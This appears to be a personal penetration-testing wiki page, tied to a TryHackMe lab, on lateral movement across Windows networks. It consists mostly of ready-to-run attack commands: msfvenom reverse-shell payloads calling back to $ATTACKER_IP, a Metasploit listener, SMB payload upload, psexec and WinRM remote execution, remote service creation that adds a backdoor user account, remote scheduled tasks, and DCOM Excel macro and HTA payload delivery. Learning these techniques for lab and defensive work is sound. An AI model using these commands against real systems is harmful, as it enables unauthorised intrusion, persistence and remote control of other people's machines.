# Windows Network Lateral Movement
The articles [[Network-Protocols]], [[Network-Services]] and [[Windows-Networking]] will provide theory background information, while [[Windows-Networking-Commands]], [[Windows-CLI-cmd]] ,[[SMB-Recon-Cheatsheet]] and [[RPCClient-Cheatsheet]] articles will provide command cheatsheet referal.

## MSFVenom
[[MSFvenom-Payloads]] for exe-service
```bash
 msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=$ATTACKER_IP LPORT=4444 -o myservice.exe
```
Upload with smbclient
```bash
smbclient -c 'put myservice.exe' -U <username> -W <workgroup> '//<domain>/share$' <Password> 
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST $ATTACKER_IP; set LPORT 4444;exploit"
```

```shell-session
runas /netonly /user:<DOMAIN>\<username> "c:\reverse\shell.exe <options> $ATTACKER_IP $PORT"
```

## Spawning Process Remotely
See [[Windows-Processes]] for more information on Service and Processes. [Psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) of Sysinternal Tools is used by Admins so will less likely blocked by Firewall. See [[Sysinternals-Hub]] for more Sysinternals. Requires:
1. Port 445/TCP (SMB) 
1. Requires: `Administrator Group` Membership

`psexec` connects to `Admin$` share and uploads a service binary with the name  `psexesvc.exe` then connects to service control manager to create and run a service named `PSEXESVC` and associates the service binary with `C:\Windows\psexesvc.exe`, finally creating named pipes to handles Std(in/out/err).

```powershell
psexec64.exe \\$IP -u Administrator -p ******** -i cmd.exe
```

It is also an Impacket tool see [[Impacket-Cheatsheet]]

## Remote Process Creation Using WinRM
[Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely, with most Windows Server installations have WinRM enabled by default.

1. Ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
2. Requires: `Remote Management Users Group` Membership

Connect to remote powershell session:
```powershell
winrs.exe -u:Administrator -p:********** -r:$target cmd
```

[Lateral movement and pivoting THM Room](https://tryhackme.com/room/lateralmovementandpivoting) suggests that you can accomplish a similar thing with a Powershell by creating a PSCredential object:
```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Enter-PSSession cmdlet to create and interactive session:
```powershell
Enter-PSSession -Computername $TARGET -Credential $credential
```

Using Invoke-Command cmdlet we can run ScriptBlocks remote via WinRM. 
```powershell
Invoke-Command -Computername $TARGET -Credential $credential -ScriptBlock {whoami}
```

## Remote Service Creation with `sc`
1. Ports:  
	1. 135/TCP, 49152-65535/TCP (DCE/RPC)
	2. 445/TCP (RPC over SMB Named Pipes)
	3. 139/TCP (RPC over SMB Named Pipes)
2.  Requires: `Administrator Group` Membership

Windows Ser services execute a command when started, `sc` we create a service on a remote host and attempt to connect to the Service Control Manager(SVCCTL) remote service program through RPC in multiple ways.
1. DCE/RPC `Request -> EMP(port 135) -> Response=SVCCTL is <dynamic port>` Then `RPC Bind to SVCCTL on <dynamic port>`
2. If the above failes `sc` connects to port `Named pipe <\pipe\svcctl\>` on port 445 (SMB or 139 ()

```powershell
sc.exe \\$TARGET create Badbadservice binPath= "net user friend Pass123 /add" start= auto
sc.exe \\$TARGET start Badbadservice
# To Stop and Delete service 
sc.exe \\$TARGET stop Badbadservice
sc.exe \\$TARGET delete Badbadservice
```

## Creating Scheduled Tasks Remotely
`schtasks` can create tasks remotely with `/s` flag.
```powershell
schtasks /s $TARGET /RU "SYSTEM" /create /tn "Badtask" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s $TARGET /run /TN "Badtask" 
# To delete
schtasks /S $TARGET /TN "Badtask" /DELETE /F
```

## Exploitation Hashes and Ticket passing for Lateral Movement

See indiviual articles:
[[Pass-The-Hash]]
[[Overpass-The-Hash]]
[[Pass-the-Ticket]]


## Distributed Component Object Model(DCOM)
[The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other](https://en.wikipedia.org/wiki/Component_Object_Model). Similar to [[Object-Oriented-Programming]], but for OS objects and thier interactions. [DCOM](https://en.wikipedia.org/wiki/Distributed_Component_Object_Model) being *Distributed* object across a Windows Network. They ancient technologies that are present in the early days of Windows. One of many [[Network-Services]] used in AD it specifically interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager, which is essentially an API. [Enigmaox3](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)

There are various Microsoft Office DCOM objects that allow for lateral movement.
```powershell
# Create an instance, listing all avaliable methods 
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "$IP"))
$com | Get-Member
```
With the `Run` method we can run VBA macro remotely.
```vba
Sub mymacro()
    Shell ("cmd.exe")
End Sub
```
Using legacy .xls formatting the macro is write inside the Office \*-application and then copied to a remote filesystem through SMB using .NET `Copy` method of `System.IO.File` class.
```powershell
$LocalPath = "C:\Users\Administrator\mytrojan.xls"

$RemotePath = "\\$IP\c$\myexcel.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
```
To then open it remotely
```powershell
$Path = "\\$IP\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\myexcel.xls")

$com.Run("mymacro")
```

The base64 encode [[MSFvenom-Payloads]] command to create HTA attack is:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f hta-psh -o evil.hta
```
The LHOST can be the DC that can called back to a listener.

[[Impacket-Cheatsheet]] with dccomexec.py

## Pass the ccache
[hackingarticles](https://www.hackingarticles.in/lateral-movement-pass-the-ccache/)



## References
[Lateral movement and pivoting THM Room](https://tryhackme.com/room/lateralmovementandpivoting)
[hackingarticles](https://www.hackingarticles.in/lateral-movement-pass-the-ccache/)
[Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) 
[Psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
[Metasploit PsExec](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)
[Alternate PtH methods](https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/0)
[Graeber BH Whitepaper](https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf)
[DCOM](https://en.wikipedia.org/wiki/Distributed_Component_Object_Model) 
[COM](https://en.wikipedia.org/wiki/Component_Object_Model)
[MS DCOM Documentation](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0?redirectedfrom=MSDN) [Enigmaox3](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)